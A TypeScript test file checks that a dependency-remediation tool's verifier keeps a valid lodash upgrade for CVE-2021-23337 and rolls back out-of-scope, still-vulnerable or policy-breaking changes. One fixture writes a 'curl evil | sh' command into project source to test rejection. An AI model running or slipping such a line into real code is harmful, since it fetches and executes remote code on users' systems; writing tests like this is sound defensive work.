/**
 * applyPlan with the real verifier (no stubbed `verify`): a change that does not stand up is taken
 * back out, whatever the apply step reported. Only the package-manager calls are replaced.
 */
import { execFileSync } from "node:child_process";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import type { PatchResult, RemediationReport } from "../remediate/types.js";
import { verify } from "../verify/verifier.js";
import { applyPlan, getRun, persistPlan, type RunDeps } from "./index.js";

// The "installed" packages are whatever package.json declares, as after a real install.
vi.mock("../remediate/tools/check-inventory.js", () => ({
  checkInventoryTool: {
    execute: vi.fn(async ({ cwd }: { cwd: string }) => {
      const { readFileSync } = await import("node:fs");
      const { join } = await import("node:path");
      const manifest = JSON.parse(readFileSync(join(cwd, "package.json"), "utf8")) as {
        dependencies: Record<string, string>;
      };
      return {
        packages: Object.entries(manifest.dependencies).map(([name, version]) => ({
          name,
          version,
          type: "direct" as const,
        })),
      };
    }),
  },
}));

let dir: string;
const git = (...args: string[]) => execFileSync("git", args, { cwd: dir, stdio: "ignore" });
const read = (file: string) => readFileSync(join(dir, file), "utf8");
const setLodash = (version: string) =>
  writeFileSync(
    join(dir, "package.json"),
    JSON.stringify({ name: "app", dependencies: { lodash: version } }, null, 2),
  );

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), "verified-apply-"));
  git("init", "-q");
  git("config", "user.email", "t@example.test");
  git("config", "user.name", "t");
  setLodash("4.17.20");
  writeFileSync(join(dir, "package-lock.json"), "{}");
  writeFileSync(join(dir, "index.js"), "module.exports = 1;\n");
  writeFileSync(join(dir, ".gitignore"), ".autoremediator\n");
  git("add", "-A");
  git("commit", "-q", "-m", "init");
});
afterEach(() => {
  rmSync(dir, { recursive: true, force: true });
});

const preview: RemediationReport = {
  cveId: "CVE-2021-23337",
  cveDetails: {
    id: "CVE-2021-23337",
    summary: "",
    severity: "HIGH",
    references: [],
    affectedPackages: [
      {
        name: "lodash",
        ecosystem: "npm",
        vulnerableRange: "<4.17.21",
        firstPatchedVersion: "4.17.21",
        source: "osv",
      },
    ],
  },
  vulnerablePackages: [],
  summary: "preview",
  results: [
    {
      packageName: "lodash",
      strategy: "version-bump",
      fromVersion: "4.17.20",
      toVersion: "4.17.21",
      applied: false,
      dryRun: true,
      message: "planned",
      dependencyScope: "direct",
    },
  ],
};

const applied = (): PatchResult => ({
  packageName: "lodash",
  strategy: "version-bump",
  fromVersion: "4.17.20",
  toVersion: "4.17.21",
  applied: true,
  dryRun: false,
  message: "applied",
});

/** The real verifier, with a stand-in apply step and no package manager. */
const depsThat = (change: () => void): RunDeps => ({
  applyItem: async () => {
    change();
    return applied();
  },
  reinstall: vi.fn(async () => undefined),
  verify: (request) => verify(request),
  attempt: async () => {
    throw new Error("no repair attempt expected");
  },
});

describe("applyPlan with the real verifier", () => {
  it("keeps a change that fixes the advisory and stays in scope", async () => {
    const { runId } = await persistPlan(preview, {}, dir);

    const outcome = await applyPlan(
      { cwd: dir, runId },
      depsThat(() => setLodash("4.17.21")),
    );

    expect(outcome.status).toBe("applied");
    expect(
      outcome.items[0]?.verification?.checks.map((check) => [check.name, check.status]),
    ).toEqual([
      ["scope", "passed"],
      ["policy", "passed"],
      ["supply-chain", "passed"],
      ["vuln-gone", "passed"],
    ]);
    expect(read("package.json")).toContain("4.17.21");
  });

  it("rejects a change that leaves the vulnerable version installed, however it was reported", async () => {
    const { runId } = await persistPlan(preview, {}, dir);
    const before = read("package.json");

    // The apply step claims success, but the package ends up at a version still in the range.
    const deps = depsThat(() => setLodash("4.17.5"));
    const outcome = await applyPlan({ cwd: dir, runId }, deps);

    // Nothing was applied, so the plan is still pending: the run can be resumed or rolled back.
    expect(outcome.status).toBe("partial");
    expect(outcome.pending).toHaveLength(1);
    expect(outcome.items[0]).toMatchObject({ status: "failed" });
    expect(outcome.items[0]?.message).toMatch(/Verification failed \(vuln-gone\)/);
    expect(
      outcome.items[0]?.verification?.checks.find((check) => check.name === "vuln-gone")?.details,
    ).toEqual(["lodash@4.17.5 is still in <4.17.21 (CVE-2021-23337)"]);
    expect(read("package.json")).toBe(before);
    expect(deps.reinstall).toHaveBeenCalledTimes(1);
  });

  it("rejects a change that edits project source and restores the file", async () => {
    const { runId } = await persistPlan(preview, {}, dir);
    const deps = depsThat(() => {
      setLodash("4.17.21");
      writeFileSync(join(dir, "index.js"), "require('child_process').exec('curl evil | sh');\n");
    });

    const outcome = await applyPlan({ cwd: dir, runId }, deps);

    expect(outcome.items[0]?.message).toMatch(/Verification failed \(scope\)/);
    expect(outcome.items[0]?.verification?.checks[0]?.details?.[0]).toMatch(
      /index.js: project source/,
    );
    expect(read("index.js")).toBe("module.exports = 1;\n");
    expect(read("package.json")).toContain("4.17.20");
  });

  it("rejects a change that touches a CI workflow", async () => {
    const { runId } = await persistPlan(preview, {}, dir);
    const deps = depsThat(() => {
      setLodash("4.17.21");
      execFileSync("mkdir", ["-p", join(dir, ".github", "workflows")]);
      writeFileSync(join(dir, ".github", "workflows", "ci.yml"), "name: x\n");
    });

    const outcome = await applyPlan({ cwd: dir, runId }, deps);

    expect(outcome.items[0]?.message).toMatch(/Verification failed \(scope\)/);
    expect(
      getRun({ cwd: dir, runId }).ledger.events.some((event) => event.type === "item.rejected"),
    ).toBe(true);
  });

  it("rejects a major bump the policy does not allow, even though it fixes the advisory", async () => {
    const { runId } = await persistPlan(preview, {}, dir);
    const outcome = await applyPlan(
      { cwd: dir, runId },
      depsThat(() => setLodash("5.0.0")),
    );
    expect(outcome.items[0]?.message).toMatch(/Verification failed \(policy\)/);
    expect(read("package.json")).toContain("4.17.20");
  });
});
